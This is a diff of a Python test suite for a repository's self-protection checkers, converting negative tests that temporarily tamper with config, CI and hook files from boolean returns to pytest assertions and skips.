@@ -13,6 +13,8 @@ import re
 import textwrap
 from typing import Any
 
+import pytest
+
 import self_protection as sp
 
 # Reset caches before each test.
@@ -44,7 +46,7 @@ def test_exit_codes_valid_missing_code():
         result = sp.exit_codes_valid({})
     finally:
         errors_ts.write_text(original, encoding="utf-8")
-    return _pass_if_false(result, "exit_codes_valid_missing_code")
+    assert _pass_if_false(result, "exit_codes_valid_missing_code"), "checker did not detect violation: exit_codes_valid_missing_code"
 
 
 def test_exit_codes_valid_wrong_value():
@@ -57,7 +59,7 @@ def test_exit_codes_valid_wrong_value():
         result = sp.exit_codes_valid({})
     finally:
         errors_ts.write_text(original, encoding="utf-8")
-    return _pass_if_false(result, "exit_codes_valid_wrong_value")
+    assert _pass_if_false(result, "exit_codes_valid_wrong_value"), "checker did not detect violation: exit_codes_valid_wrong_value"
 
 
 def test_cli_exit_code_enum_complete_missing_class():
@@ -75,7 +77,7 @@ def test_cli_exit_code_enum_complete_missing_class():
         result = sp.cli_exit_code_enum_complete({})
     finally:
         errors_ts.write_text(original, encoding="utf-8")
-    return _pass_if_false(result, "cli_exit_code_enum_missing_class")
+    assert _pass_if_false(result, "cli_exit_code_enum_missing_class"), "checker did not detect violation: cli_exit_code_enum_missing_class"
 
 
 # ---------------------------------------------------------------------------
@@ -145,10 +147,10 @@ def test_operator_count_stable_low_count():
             result = sp.operator_count_stable({})
         finally:
             operators_ts.write_text(original, encoding="utf-8")
-        return _pass_if_false(result, "operator_count_stable_low_count")
+        assert _pass_if_false(result, "operator_count_stable_low_count"), "checker did not detect violation: operator_count_stable_low_count"
+        return
 
-    print("  SKIP: not enough operators to remove")
-    return True  # Skip counts as pass
+    pytest.skip("not enough operators to remove")
 
 
 # ---------------------------------------------------------------------------
@@ -169,7 +171,7 @@ def test_operator_spec_consistent_missing_field():
         result = sp.operator_spec_consistent({})
     finally:
         operators_ts.write_text(original, encoding="utf-8")
-    return _pass_if_false(result, "operator_spec_consistent_missing_field")
+    assert _pass_if_false(result, "operator_spec_consistent_missing_field"), "checker did not detect violation: operator_spec_consistent_missing_field"
 
 
 # ---------------------------------------------------------------------------
@@ -186,7 +188,7 @@ def test_manifest_hash_algorithm_weaker():
         result = sp.manifest_hash_algorithm({})
     finally:
         manifest_ts.write_text(original, encoding="utf-8")
-    return _pass_if_false(result, "manifest_hash_algorithm_weaker")
+    assert _pass_if_false(result, "manifest_hash_algorithm_weaker"), "checker did not detect violation: manifest_hash_algorithm_weaker"
 
 
 # ---------------------------------------------------------------------------
@@ -203,7 +205,7 @@ def test_structural_types_stable_missing_type():
         result = sp.structural_types_stable({})
     finally:
         types_ts.write_text(original, encoding="utf-8")
-    return _pass_if_false(result, "structural_types_stable_missing_type")
+    assert _pass_if_false(result, "structural_types_stable_missing_type"), "checker did not detect violation: structural_types_stable_missing_type"
 
 
 # ---------------------------------------------------------------------------
@@ -233,7 +235,7 @@ def test_manifest_version_stable_mismatch():
             manifest_path.write_text(original_content, encoding="utf-8")
         else:
             manifest_path.unlink()
-    return _pass_if_false(result, "manifest_version_stable_mismatch")
+    assert _pass_if_false(result, "manifest_version_stable_mismatch"), "checker did not detect violation: manifest_version_stable_mismatch"
 
 
 def test_manifest_version_stable_missing_field():
@@ -258,7 +260,7 @@ def test_manifest_version_stable_missing_field():
             manifest_path.write_text(original_content, encoding="utf-8")
         else:
             manifest_path.unlink()
-    return _pass_if_false(result, "manifest_version_stable_missing_field")
+    assert _pass_if_false(result, "manifest_version_stable_missing_field"), "checker did not detect violation: manifest_version_stable_missing_field"
 
 
 # ---------------------------------------------------------------------------
@@ -275,7 +277,7 @@ def test_required_commands_exist_missing():
         result = sp.required_commands_exist({})
     finally:
         backup_ts.rename(lock_ts)
-    return _pass_if_false(result, "required_commands_exist_missing")
+    assert _pass_if_false(result, "required_commands_exist_missing"), "checker did not detect violation: required_commands_exist_missing"
 
 
 # ---------------------------------------------------------------------------
@@ -292,7 +294,7 @@ def test_config_manifest_path_safe_no_validation():
         result = sp.config_manifest_path_safe({})
     finally:
         load_config_ts.write_text(original, encoding="utf-8")
-    return _pass_if_false(result, "config_manifest_path_safe_no_validation")
+    assert _pass_if_false(result, "config_manifest_path_safe_no_validation"), "checker did not detect violation: config_manifest_path_safe_no_validation"
 
 
 # ---------------------------------------------------------------------------
@@ -311,7 +313,7 @@ def test_hooks_fail_closed_no_try():
         result = sp.hooks_fail_closed({})
     finally:
         pre_tool.write_text(original, encoding="utf-8")
-    return _pass_if_false(result, "hooks_fail_closed_no_try")
+    assert _pass_if_false(result, "hooks_fail_closed_no_try"), "checker did not detect violation: hooks_fail_closed_no_try"
 
 
 # ---------------------------------------------------------------------------
@@ -334,7 +336,7 @@ def test_hooks_registration_missing_script():
         result = sp.hooks_registration_complete({})
     finally:
         hooks_json.write_text(original, encoding="utf-8")
-    return _pass_if_false(result, "hooks_registration_missing_script")
+    assert _pass_if_false(result, "hooks_registration_missing_script"), "checker did not detect violation: hooks_registration_missing_script"
 
 
 # ---------------------------------------------------------------------------
@@ -357,7 +359,7 @@ def test_protected_pattern_safe_traversal():
         result = sp.protected_pattern_safe({})
     finally:
         defaults_ts.write_text(original, encoding="utf-8")
-    return _pass_if_false(result, "protected_pattern_safe_traversal")
+    assert _pass_if_false(result, "protected_pattern_safe_traversal"), "checker did not detect violation: protected_pattern_safe_traversal"
 
 
 # ---------------------------------------------------------------------------
@@ -374,7 +376,7 @@ def test_error_code_families_missing_class():
         result = sp.error_code_families_present({})
     finally:
         stele_error_ts.write_text(original, encoding="utf-8")
-    return _pass_if_false(result, "error_code_families_missing_class")
+    assert _pass_if_false(result, "error_code_families_missing_class"), "checker did not detect violation: error_code_families_missing_class"
 
 
 # ---------------------------------------------------------------------------
@@ -401,7 +403,7 @@ def test_cdl_no_single_quotes_violation():
         result = sp.cdl_no_single_quotes({})
     finally:
         stele_file.unlink(missing_ok=True)
-    return _pass_if_false(result, "cdl_no_single_quotes_violation")
+    assert _pass_if_false(result, "cdl_no_single_quotes_violation"), "checker did not detect violation: cdl_no_single_quotes_violation"
 
 
 # ---------------------------------------------------------------------------
@@ -418,7 +420,7 @@ def test_inline_version_sync_mismatch():
         result = sp.inline_version_sync({})
     finally:
         manifest_ts.write_text(original, encoding="utf-8")
-    return _pass_if_false(result, "inline_version_sync_mismatch")
+    assert _pass_if_false(result, "inline_version_sync_mismatch"), "checker did not detect violation: inline_version_sync_mismatch"
 
 
 # ---------------------------------------------------------------------------
@@ -435,7 +437,7 @@ def test_backend_registries_missing_language():
         result = sp.backend_registries({})
     finally:
         registry_ts.write_text(original, encoding="utf-8")
-    return _pass_if_false(result, "backend_registries_missing_language")
+    assert _pass_if_false(result, "backend_registries_missing_language"), "checker did not detect violation: backend_registries_missing_language"
 
 
 def test_backend_contains_go_missing():
@@ -448,7 +450,7 @@ def test_backend_contains_go_missing():
         result = sp.backend_contains_go({})
     finally:
         registry_ts.write_text(original, encoding="utf-8")
-    return _pass_if_false(result, "backend_contains_go_missing")
+    assert _pass_if_false(result, "backend_contains_go_missing"), "checker did not detect violation: backend_contains_go_missing"
 
 
 # ---------------------------------------------------------------------------
@@ -467,7 +469,7 @@ def test_config_schema_valid_missing_field():
         result = sp.config_schema_valid({})
     finally:
         config_path.write_text(original, encoding="utf-8")
-    return _pass_if_false(result, "config_schema_valid_missing_field")
+    assert _pass_if_false(result, "config_schema_valid_missing_field"), "checker did not detect violation: config_schema_valid_missing_field"
 
 
 # ---------------------------------------------------------------------------
@@ -485,14 +487,13 @@ def test_all_evaluators_compile_missing_dist():
     dist_dir = sp._PACKAGES_DIR / "effect-evaluator" / "dist"
     backup_dir = sp._PACKAGES_DIR / "effect-evaluator" / "dist.bak-negtest"
     if not dist_dir.is_dir():
-        print("  SKIP: effect-evaluator/dist/ not built; run pnpm build first")
-        return True
+        pytest.skip("effect-evaluator/dist/ not built; run pnpm build first")
     dist_dir.rename(backup_dir)
     try:
         result = sp.all_evaluators_compile({})
     finally:
         backup_dir.rename(dist_dir)
-    return _pass_if_false(result, "all_evaluators_compile_missing_dist")
+    assert _pass_if_false(result, "all_evaluators_compile_missing_dist"), "checker did not detect violation: all_evaluators_compile_missing_dist"
 
 
 # ---------------------------------------------------------------------------
@@ -505,8 +506,7 @@ def test_strict_mode_default_in_ci_lenient_flag():
     _reset_caches()
     ci_yml = sp._REPO_ROOT / ".github" / "workflows" / "ci.yml"
     if not ci_yml.is_file():
-        print("  SKIP: .github/workflows/ci.yml not present")
-        return True
+        pytest.skip(".github/workflows/ci.yml not present")
     original = ci_yml.read_text(encoding="utf-8")
     tampered = original.replace(
         "pnpm test",
@@ -518,7 +518,7 @@ def test_strict_mode_default_in_ci_lenient_flag():
         result = sp.strict_mode_default_in_ci({})
     finally:
         ci_yml.write_text(original, encoding="utf-8")
-    return _pass_if_false(result, "strict_mode_default_in_ci_lenient_flag")
+    assert _pass_if_false(result, "strict_mode_default_in_ci_lenient_flag"), "checker did not detect violation: strict_mode_default_in_ci_lenient_flag"
 
 
 # ---------------------------------------------------------------------------
@@ -531,8 +531,7 @@ def test_fix_hint_requires_analysis_branch_missing_keyword():
     _reset_caches()
     fix_hint_ts = sp._PACKAGES_DIR / "effect-evaluator" / "src" / "fix-hint.ts"
     if not fix_hint_ts.is_file():
-        print("  SKIP: effect-evaluator/src/fix-hint.ts not present")
-        return True
+        pytest.skip("effect-evaluator/src/fix-hint.ts not present")
     original = fix_hint_ts.read_text(encoding="utf-8")
     # The default fix-hint uses `[A] Code issue` literals; rip them out.
     tampered = original.replace("[A]", "(branch-A)")
@@ -541,7 +540,7 @@ def test_fix_hint_requires_analysis_branch_missing_keyword():
         result = sp.fix_hint_requires_analysis_branch({})
     finally:
         fix_hint_ts.write_text(original, encoding="utf-8")
-    return _pass_if_false(result, "fix_hint_requires_analysis_branch_missing_keyword")
+    assert _pass_if_false(result, "fix_hint_requires_analysis_branch_missing_keyword"), "checker did not detect violation: fix_hint_requires_analysis_branch_missing_keyword"
 
 
 def test_strict_mode_default_in_ci_env_injection():
@@ -551,8 +550,7 @@ def test_strict_mode_default_in_ci_env_injection():
     _reset_caches()
     ci_yml = sp._REPO_ROOT / ".github" / "workflows" / "ci.yml"
     if not ci_yml.is_file():
-        print("  SKIP: .github/workflows/ci.yml not present")
-        return True
+        pytest.skip(".github/workflows/ci.yml not present")
     original = ci_yml.read_text(encoding="utf-8")
     # Inject an env block whose value carries the lenient flag.
     tampered = original.replace(
@@ -565,7 +563,7 @@ def test_strict_mode_default_in_ci_env_injection():
         result = sp.strict_mode_default_in_ci({})
     finally:
         ci_yml.write_text(original, encoding="utf-8")
-    return _pass_if_false(result, "strict_mode_default_in_ci_env_injection")
+    assert _pass_if_false(result, "strict_mode_default_in_ci_env_injection"), "checker did not detect violation: strict_mode_default_in_ci_env_injection"
 
 
 def test_strict_mode_default_in_ci_via_package_json_script():
@@ -575,8 +573,7 @@ def test_strict_mode_default_in_ci_via_package_json_script():
     _reset_caches()
     pkg = sp._REPO_ROOT / "package.json"
     if not pkg.is_file():
-        print("  SKIP: package.json missing")
-        return True
+        pytest.skip("package.json missing")
     original = pkg.read_text(encoding="utf-8")
     import json as _json
     data = _json.loads(original)
@@ -588,7 +585,7 @@ def test_strict_mode_default_in_ci_via_package_json_script():
         result = sp.strict_mode_default_in_ci({})
     finally:
         pkg.write_text(original, encoding="utf-8")
-    return _pass_if_false(result, "strict_mode_default_in_ci_via_package_json_script")
+    assert _pass_if_false(result, "strict_mode_default_in_ci_via_package_json_script"), "checker did not detect violation: strict_mode_default_in_ci_via_package_json_script"
 
 
 def test_strict_mode_default_in_ci_via_python_script_delegation():
@@ -599,8 +596,7 @@ def test_strict_mode_default_in_ci_via_python_script_delegation():
     ci_yml = sp._REPO_ROOT / ".github" / "workflows" / "ci.yml"
     scripts_dir = sp._REPO_ROOT / "scripts"
     if not ci_yml.is_file() or not scripts_dir.is_dir():
-        print("  SKIP: .github/workflows/ci.yml or scripts/ missing")
-        return True
+        pytest.skip(".github/workflows/ci.yml or scripts/ missing")
     original_ci = ci_yml.read_text(encoding="utf-8")
     py_script = scripts_dir / "negtest-py-lenient.py"
     try:
@@ -618,7 +614,7 @@ def test_strict_mode_default_in_ci_via_python_script_delegation():
     finally:
         ci_yml.write_text(original_ci, encoding="utf-8")
         py_script.unlink(missing_ok=True)
-    return _pass_if_false(result, "strict_mode_default_in_ci_via_python_script_delegation")
+    assert _pass_if_false(result, "strict_mode_default_in_ci_via_python_script_delegation"), "checker did not detect violation: strict_mode_default_in_ci_via_python_script_delegation"
 
 
 def test_strict_mode_default_in_ci_via_referenced_script():
@@ -629,8 +625,7 @@ def test_strict_mode_default_in_ci_via_referenced_script():
     ci_yml = sp._REPO_ROOT / ".github" / "workflows" / "ci.yml"
     scripts_dir = sp._REPO_ROOT / "scripts"
     if not ci_yml.is_file() or not scripts_dir.is_dir():
-        print("  SKIP: .github/workflows/ci.yml or scripts/ missing")
-        return True
+        pytest.skip(".github/workflows/ci.yml or scripts/ missing")
     original_ci = ci_yml.read_text(encoding="utf-8")
     new_script = scripts_dir / "negtest-strict-mode.sh"
     try:
@@ -650,7 +645,7 @@ def test_strict_mode_default_in_ci_via_referenced_script():
     finally:
         ci_yml.write_text(original_ci, encoding="utf-8")
         new_script.unlink(missing_ok=True)
-    return _pass_if_false(result, "strict_mode_default_in_ci_via_referenced_script")
+    assert _pass_if_false(result, "strict_mode_default_in_ci_via_referenced_script"), "checker did not detect violation: strict_mode_default_in_ci_via_referenced_script"
 
 
 def test_default_protected_consistent_drops_pattern_in_one_list():
@@ -659,8 +654,7 @@ def test_default_protected_consistent_drops_pattern_in_one_list():
     _reset_caches()
     core_defaults = sp._PACKAGES_DIR / "core" / "src" / "config" / "defaults.ts"
     if not core_defaults.is_file():
-        print("  SKIP: core defaults.ts missing")
-        return True
+        pytest.skip("core defaults.ts missing")
     original = core_defaults.read_text(encoding="utf-8")
     tampered = original.replace('".stele/stop-state.json"', '"REMOVED-FOR-NEGTEST"', 1)
     core_defaults.write_text(tampered, encoding="utf-8")
@@ -668,7 +662,7 @@ def test_default_protected_consistent_drops_pattern_in_one_list():
         result = sp.default_protected_consistent({})
     finally:
         core_defaults.write_text(original, encoding="utf-8")
-    return _pass_if_false(result, "default_protected_consistent_drops_pattern_in_one_list")
+    assert _pass_if_false(result, "default_protected_consistent_drops_pattern_in_one_list"), "checker did not detect violation: default_protected_consistent_drops_pattern_in_one_list"
 
 
 def test_esm_relative_imports_keep_js_missing_suffix():
@@ -684,7 +678,7 @@ def test_esm_relative_imports_keep_js_missing_suffix():
         result = sp.esm_relative_imports_keep_js({})
     finally:
         target.unlink(missing_ok=True)
-    return _pass_if_false(result, "esm_relative_imports_keep_js_missing_suffix")
+    assert _pass_if_false(result, "esm_relative_imports_keep_js_missing_suffix"), "checker did not detect violation: esm_relative_imports_keep_js_missing_suffix"
 
 
 def test_hook_entrypoints_fail_closed_catch_swallows_error():
@@ -694,8 +688,7 @@ def test_hook_entrypoints_fail_closed_catch_swallows_error():
     _reset_caches()
     hook = sp._PACKAGES_DIR / "claude-code-plugin" / "scripts" / "pre-tool-protect.js"
     if not hook.is_file():
-        print("  SKIP: pre-tool-protect.js missing")
-        return True
+        pytest.skip("pre-tool-protect.js missing")
     original = hook.read_text(encoding="utf-8")
     # Replace the literal `failClosed(` call inside catch bodies with a
     # console.error (so the catch swallows). Preserve all other
@@ -708,7 +701,7 @@ def test_hook_entrypoints_fail_closed_catch_swallows_error():
         result = sp.hook_entrypoints_fail_closed({})
     finally:
         hook.write_text(original, encoding="utf-8")
-    return _pass_if_false(result, "hook_entrypoints_fail_closed_catch_swallows_error")
+    assert _pass_if_false(result, "hook_entrypoints_fail_closed_catch_swallows_error"), "checker did not detect violation: hook_entrypoints_fail_closed_catch_swallows_error"
 
 
 def test_core_has_no_stele_deps_dynamic_import():
@@ -728,7 +721,7 @@ def test_core_has_no_stele_deps_dynamic_import():
         result = sp.core_has_no_stele_deps({})
     finally:
         target.unlink(missing_ok=True)
-    return _pass_if_false(result, "core_has_no_stele_deps_dynamic_import")
+    assert _pass_if_false(result, "core_has_no_stele_deps_dynamic_import"), "checker did not detect violation: core_has_no_stele_deps_dynamic_import"
 
 
 def test_fix_hint_requires_analysis_branch_content_inversion():
@@ -741,8 +734,7 @@ def test_fix_hint_requires_analysis_branch_content_inversion():
     _reset_caches()
     fix_hint_ts = sp._PACKAGES_DIR / "type-state-evaluator" / "src" / "fix-hint.ts"
     if not fix_hint_ts.is_file():
-        print("  SKIP: type-state-evaluator/src/fix-hint.ts not present")
-        return True
+        pytest.skip("type-state-evaluator/src/fix-hint.ts not present")
     original = fix_hint_ts.read_text(encoding="utf-8")
     # Surgically rewrite the [A] body to remove every action verb and any
     # template interpolation, while preserving the [A] / [B] anchor labels
@@ -774,7 +766,7 @@ def test_fix_hint_requires_analysis_branch_content_inversion():
         result = sp.fix_hint_requires_analysis_branch({})
     finally:
         fix_hint_ts.write_text(original, encoding="utf-8")
-    return _pass_if_false(result, "fix_hint_requires_analysis_branch_content_inversion")
+    assert _pass_if_false(result, "fix_hint_requires_analysis_branch_content_inversion"), "checker did not detect violation: fix_hint_requires_analysis_branch_content_inversion"
 
 
 def test_fix_hint_requires_analysis_branch_semantic_inversion():
@@ -786,8 +778,7 @@ def test_fix_hint_requires_analysis_branch_semantic_inversion():
     _reset_caches()
     fix_hint_ts = sp._PACKAGES_DIR / "trace-evaluator" / "src" / "fix-hint-substitution.ts"
     if not fix_hint_ts.is_file():
-        print("  SKIP: trace-evaluator/src/fix-hint-substitution.ts not present")
-        return True
+        pytest.skip("trace-evaluator/src/fix-hint-substitution.ts not present")
     original = fix_hint_ts.read_text(encoding="utf-8")
     tampered = original.replace("[A] Code issue", "[A] Contract issue")
     fix_hint_ts.write_text(tampered, encoding="utf-8")
@@ -795,7 +786,7 @@ def test_fix_hint_requires_analysis_branch_semantic_inversion():
         result = sp.fix_hint_requires_analysis_branch({})
     finally:
         fix_hint_ts.write_text(original, encoding="utf-8")
-    return _pass_if_false(result, "fix_hint_requires_analysis_branch_semantic_inversion")
+    assert _pass_if_false(result, "fix_hint_requires_analysis_branch_semantic_inversion"), "checker did not detect violation: fix_hint_requires_analysis_branch_semantic_inversion"
 
 
 def test_cdl_utf8_valid_invalid_bytes():
@@ -808,7 +799,7 @@ def test_cdl_utf8_valid_invalid_bytes():
         result = sp.cdl_utf8_valid({})
     finally:
         stele_file.unlink(missing_ok=True)
-    return _pass_if_false(result, "cdl_utf8_valid_invalid_bytes")
+    assert _pass_if_false(result, "cdl_utf8_valid_invalid_bytes"), "checker did not detect violation: cdl_utf8_valid_invalid_bytes"
 
 
 # ---------------------------------------------------------------------------
@@ -830,7 +821,7 @@ def test_no_cjs_require_in_ts_source_catches_require():
         result = sp.no_cjs_require_in_ts_source({})
     finally:
         target.unlink(missing_ok=True)
-    return _pass_if_false(result, "no_cjs_require_in_ts_source_catches_require")
+    assert _pass_if_false(result, "no_cjs_require_in_ts_source_catches_require"), "checker did not detect violation: no_cjs_require_in_ts_source_catches_require"
 
 
 def test_tsconfig_base_strict_mode_weakened():
@@ -840,8 +831,7 @@ def test_tsconfig_base_strict_mode_weakened():
     _reset_caches()
     tsconfig_path = sp._REPO_ROOT / "tsconfig.base.json"
     if not tsconfig_path.is_file():
-        print("  SKIP: tsconfig.base.json not present")
-        return True
+        pytest.skip("tsconfig.base.json not present")
     original = tsconfig_path.read_text(encoding="utf-8")
     data = json.loads(original)
     data.setdefault("compilerOptions", {})["strictNullChecks"] = False
@@ -850,7 +840,7 @@ def test_tsconfig_base_strict_mode_weakened():
         result = sp.tsconfig_base_strict_mode({})
     finally:
         tsconfig_path.write_text(original, encoding="utf-8")
-    return _pass_if_false(result, "tsconfig_base_strict_mode_weakened")
+    assert _pass_if_false(result, "tsconfig_base_strict_mode_weakened"), "checker did not detect violation: tsconfig_base_strict_mode_weakened"
 
 
 def test_no_backward_compat_shims_catches_marker():
@@ -868,7 +858,7 @@ def test_no_backward_compat_shims_catches_marker():
         result = sp.no_backward_compat_shims({})
     finally:
         target.unlink(missing_ok=True)
-    return _pass_if_false(result, "no_backward_compat_shims_catches_marker")
+    assert _pass_if_false(result, "no_backward_compat_shims_catches_marker"), "checker did not detect violation: no_backward_compat_shims_catches_marker"
 
 
 def test_core_engine_purity_catches_date_now():
@@ -884,7 +874,7 @@ def test_core_engine_purity_catches_date_now():
         result = sp.core_engine_purity({})
     finally:
         target.unlink(missing_ok=True)
-    return _pass_if_false(result, "core_engine_purity_catches_date_now")
+    assert _pass_if_false(result, "core_engine_purity_catches_date_now"), "checker did not detect violation: core_engine_purity_catches_date_now"
 
 
 def test_cli_io_through_path_utils_catches_unsafe_write():
@@ -904,7 +894,7 @@ def test_cli_io_through_path_utils_catches_unsafe_write():
         result = sp.cli_io_through_path_utils({})
     finally:
         target.unlink(missing_ok=True)
-    return _pass_if_false(result, "cli_io_through_path_utils_catches_unsafe_write")
+    assert _pass_if_false(result, "cli_io_through_path_utils_catches_unsafe_write"), "checker did not detect violation: cli_io_through_path_utils_catches_unsafe_write"
 
 
 def test_cli_exit_code_enum_complete_missing_code_value():
@@ -914,8 +904,7 @@ def test_cli_exit_code_enum_complete_missing_code_value():
     _reset_caches()
     errors_ts = sp._PACKAGES_DIR / "cli" / "src" / "errors.ts"
     if not errors_ts.is_file():
-        print("  SKIP: errors.ts not present")
-        return True
+        pytest.skip("errors.ts not present")
     original = errors_ts.read_text(encoding="utf-8")
     tampered = re.sub(r"\bSCORE_BELOW_THRESHOLD\b", "SCORE_BELOW_LIMIT", original)
     errors_ts.write_text(tampered, encoding="utf-8")
@@ -923,7 +912,7 @@ def test_cli_exit_code_enum_complete_missing_code_value():
         result = sp.cli_exit_code_enum_complete({})
     finally:
         errors_ts.write_text(original, encoding="utf-8")
-    return _pass_if_false(result, "cli_exit_code_enum_complete_missing_code_value")
+    assert _pass_if_false(result, "cli_exit_code_enum_complete_missing_code_value"), "checker did not detect violation: cli_exit_code_enum_complete_missing_code_value"
 
 
 # ---------------------------------------------------------------------------
@@ -939,8 +928,7 @@ def test_cli_exit_code_enum_complete_stale_comment_fallback():
     _reset_caches()
     errors_ts = sp._PACKAGES_DIR / "cli" / "src" / "errors.ts"
     if not errors_ts.is_file():
-        print("  SKIP: errors.ts not present")
-        return True
+        pytest.skip("errors.ts not present")
     original = errors_ts.read_text(encoding="utf-8")
     tampered = original.replace(
         "SCORE_BELOW_THRESHOLD: 6,",
@@ -951,7 +939,7 @@ def test_cli_exit_code_enum_complete_stale_comment_fallback():
         result = sp.cli_exit_code_enum_complete({})
     finally:
         errors_ts.write_text(original, encoding="utf-8")
-    return _pass_if_false(result, "cli_exit_code_enum_complete_stale_comment_fallback")
+    assert _pass_if_false(result, "cli_exit_code_enum_complete_stale_comment_fallback"), "checker did not detect violation: cli_exit_code_enum_complete_stale_comment_fallback"
 
 
 def test_core_engine_purity_bare_imported_random():
@@ -970,7 +958,7 @@ def test_core_engine_purity_bare_imported_random():
         result = sp.core_engine_purity({})
     finally:
         target.unlink(missing_ok=True)
-    return _pass_if_false(result, "core_engine_purity_bare_imported_random")
+    assert _pass_if_false(result, "core_engine_purity_bare_imported_random"), "checker did not detect violation: core_engine_purity_bare_imported_random"
 
 
 def test_no_backward_compat_shims_compatibility_synonym():
@@ -988,7 +976,7 @@ def test_no_backward_compat_shims_compatibility_synonym():
         result = sp.no_backward_compat_shims({})
     finally:
         target.unlink(missing_ok=True)
-    return _pass_if_false(result, "no_backward_compat_shims_compatibility_synonym")
+    assert _pass_if_false(result, "no_backward_compat_shims_compatibility_synonym"), "checker did not detect violation: no_backward_compat_shims_compatibility_synonym"
 
 
 def test_no_backward_compat_shims_block_comment_marker():
@@ -1006,7 +994,7 @@ def test_no_backward_compat_shims_block_comment_marker():
         result = sp.no_backward_compat_shims({})
     finally:
         target.unlink(missing_ok=True)
-    return _pass_if_false(result, "no_backward_compat_shims_block_comment_marker")
+    assert _pass_if_false(result, "no_backward_compat_shims_block_comment_marker"), "checker did not detect violation: no_backward_compat_shims_block_comment_marker"
 
 
 def test_no_backward_compat_shims_string_smuggle_does_not_false_positive():
@@ -1025,12 +1013,8 @@ def test_no_backward_compat_shims_string_smuggle_does_not_false_positive():
         result = sp.no_backward_compat_shims({})
     finally:
         target.unlink(missing_ok=True)
-    # Inverted assertion: success means passed=True.
-    if result.get("passed") is True:
-        print(f"  OK: no_backward_compat_shims_string_smuggle_does_not_false_positive — string-literal marker correctly ignored")
-        return True
-    print(f"  MISS: false-positive on smuggled marker (result={result})")
-    return False
+    # Inverted assertion: success means passed=True (checker correctly ignored).
+    assert result.get("passed") is True, f"false-positive on smuggled marker (result={result})"
 
 
 def test_cli_io_through_path_utils_string_smuggle_does_not_satisfy():
@@ -1052,7 +1036,7 @@ def test_cli_io_through_path_utils_string_smuggle_does_not_satisfy():
         result = sp.cli_io_through_path_utils({})
     finally:
         target.unlink(missing_ok=True)
-    return _pass_if_false(result, "cli_io_through_path_utils_string_smuggle_does_not_satisfy")
+    assert _pass_if_false(result, "cli_io_through_path_utils_string_smuggle_does_not_satisfy"), "checker did not detect violation: cli_io_through_path_utils_string_smuggle_does_not_satisfy"
 
 
 def test_no_cjs_require_string_literal_does_not_false_positive():
@@ -1070,11 +1054,7 @@ def test_no_cjs_require_string_literal_does_not_false_positive():
         result = sp.no_cjs_require_in_ts_source({})
     finally:
         target.unlink(missing_ok=True)
-    if result.get("passed") is True:
-        print(f"  OK: no_cjs_require_string_literal_does_not_false_positive — string-literal require correctly ignored")
-        return True
-    print(f"  MISS: false-positive on smuggled require (result={result})")
-    return False
+    assert result.get("passed") is True, f"false-positive on smuggled require (result={result})"
 
 
 # ---------------------------------------------------------------------------
@@ -1097,7 +1077,7 @@ def test_no_cjs_require_template_literal_expression():
         result = sp.no_cjs_require_in_ts_source({})
     finally:
         target.unlink(missing_ok=True)
-    return _pass_if_false(result, "no_cjs_require_template_literal_expression")
+    assert _pass_if_false(result, "no_cjs_require_template_literal_expression"), "checker did not detect violation: no_cjs_require_template_literal_expression"
 
 
 def test_core_engine_purity_template_literal_random():
@@ -1116,7 +1096,7 @@ def test_core_engine_purity_template_literal_random():
         result = sp.core_engine_purity({})
     finally:
         target.unlink(missing_ok=True)
-    return _pass_if_false(result, "core_engine_purity_template_literal_random")
+    assert _pass_if_false(result, "core_engine_purity_template_literal_random"), "checker did not detect violation: core_engine_purity_template_literal_random"
 
 
 def test_core_engine_purity_string_mention_of_crypto_does_not_false_positive():
@@ -1139,11 +1119,7 @@ def test_core_engine_purity_string_mention_of_crypto_does_not_false_positive():
         result = sp.core_engine_purity({})
     finally:
         target.unlink(missing_ok=True)
-    if result.get("passed") is True:
-        print("  OK: core_engine_purity_string_mention_of_crypto_does_not_false_positive — gate correctly ignored string mention")
-        return True
-    print(f"  MISS: false-positive (result={result})")
-    return False
+    assert result.get("passed") is True, f"core_engine_purity false-positive (result={result})"
 
 
 def test_cli_io_through_path_utils_array_join_no_longer_satisfies():
@@ -1166,7 +1142,7 @@ def test_cli_io_through_path_utils_array_join_no_longer_satisfies():
         result = sp.cli_io_through_path_utils({})
     finally:
         target.unlink(missing_ok=True)
-    return _pass_if_false(result, "cli_io_through_path_utils_array_join_no_longer_satisfies")
+    assert _pass_if_false(result, "cli_io_through_path_utils_array_join_no_longer_satisfies"), "checker did not detect violation: cli_io_through_path_utils_array_join_no_longer_satisfies"
 
 
 def test_strip_block_comment_does_not_mis_terminate_on_slash_star_slash():
@@ -1180,11 +1156,7 @@ def test_strip_block_comment_does_not_mis_terminate_on_slash_star_slash():
     out = sp._blank_string_interiors(src)
     # The output must equal the input (no string blanking happened
     # because nothing was actually a string).
-    if out == src:
-        print("  OK: strip_block_comment_does_not_mis_terminate_on_slash_star_slash — comment preserved as-is")
-        return True
-    print(f"  MISS: blank_string_interiors mishandled `/*/ \"x\" */` (got={out!r}, want={src!r})")
-    return False
+    assert out == src, f"blank_string_interiors mishandled `/*/ \"x\" */` (got={out!r}, want={src!r})"
 
 
 # ---------------------------------------------------------------------------
@@ -1217,7 +1189,7 @@ def test_cli_io_through_path_utils_array_join_with_path_import_bypassed():
         result = sp.cli_io_through_path_utils({})
     finally:
         target.unlink(missing_ok=True)
-    return _pass_if_false(result, "cli_io_through_path_utils_array_join_with_path_import_bypassed")
+    assert _pass_if_false(result, "cli_io_through_path_utils_array_join_with_path_import_bypassed"), "checker did not detect violation: cli_io_through_path_utils_array_join_with_path_import_bypassed"
 
 
 def test_core_engine_purity_multi_line_crypto_import():
@@ -1239,7 +1211,7 @@ def test_core_engine_purity_multi_line_crypto_import():
         result = sp.core_engine_purity({})
     finally:
         target.unlink(missing_ok=True)
-    return _pass_if_false(result, "core_engine_purity_multi_line_crypto_import")
+    assert _pass_if_false(result, "core_engine_purity_multi_line_crypto_import"), "checker did not detect violation: core_engine_purity_multi_line_crypto_import"
 
 
 # ---------------------------------------------------------------------------
@@ -1268,7 +1240,7 @@ def test_cli_io_through_path_utils_template_literal_smuggled_import():
         result = sp.cli_io_through_path_utils({})
     finally:
         target.unlink(missing_ok=True)
-    return _pass_if_false(result, "cli_io_through_path_utils_template_literal_smuggled_import")
+    assert _pass_if_false(result, "cli_io_through_path_utils_template_literal_smuggled_import"), "checker did not detect violation: cli_io_through_path_utils_template_literal_smuggled_import"
 
 
 def test_bash_extractors_shared_rejects_local_redefinition():
@@ -1286,7 +1258,7 @@ def test_bash_extractors_shared_rejects_local_redefinition():
         result = sp.bash_extractors_shared({})
     finally:
         target.write_text(original, encoding="utf-8")
-    return _pass_if_false(result, "bash_extractors_shared_rejects_local_redefinition")
